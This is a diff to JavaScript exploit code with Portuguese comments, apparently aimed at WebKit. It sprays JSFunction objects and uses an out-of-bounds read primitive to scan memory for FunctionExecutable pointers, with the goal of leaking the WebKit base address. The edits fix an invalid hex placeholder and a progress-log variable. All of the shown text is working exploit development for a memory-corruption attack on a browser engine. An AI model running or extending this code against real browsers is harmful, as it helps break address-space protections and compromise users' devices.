@@ -96,7 +96,8 @@ export async function sprayAndInvestigateObjectExposure() {
         const NUM_SPRAY_FUNCS = 400; // Aumentar bastante
         for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
             sprayedFunctions.push(function(_a,_b,_c,_d,_e,_f,_g,_h,_i,_j) { // Função com mais argumentos para potencialmente aumentar tamanho do objeto FunctionExecutable
-                 let x = 0xFUNSPRAY; return _a + i + x + _j; 
+                // CORREÇÃO: "0xFUNSPRAY" é um hexadecimal inválido. Substituído por um placeholder.
+                let x = 0xFACEFEED; return _a + i + x + _j;
             });
         }
         logS3(`  ${sprayedFunctions.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
@@ -122,6 +123,7 @@ export async function sprayAndInvestigateObjectExposure() {
             // Usamos a primitiva de cópia para ler o QWORD que está nesse local.
             let potential_executable_ptr = await readFromOOBOffsetViaCopy(cell_base_offset + executablePtrOffsetFromCell);
 
+            // Verifique se potential_executable_ptr.isZero() existe em AdvancedInt64 ou substitua pela checagem de .low() e .high()
             if (potential_executable_ptr && !potential_executable_ptr.isZero() && 
                 !(potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD) &&
                 !(potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD) ) {
@@ -157,8 +159,9 @@ export async function sprayAndInvestigateObjectExposure() {
                 }
             }
             if (webkitBaseLeaked) break;
-            if (offset > SCAN_START && offset % (SCAN_STEP * 128) === 0) { 
-                logS3(`    Scan por Executable* em ${toHex(offset)}...`, "info", FNAME_CURRENT_TEST); // Corrigido para offset
+            // CORREÇÃO: Usar cell_base_offset para o log de progresso
+            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 128) === 0) { 
+                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}...`, "info", FNAME_CURRENT_TEST);
                 await PAUSE_S3(1); 
             }
         } // Fim do loop for
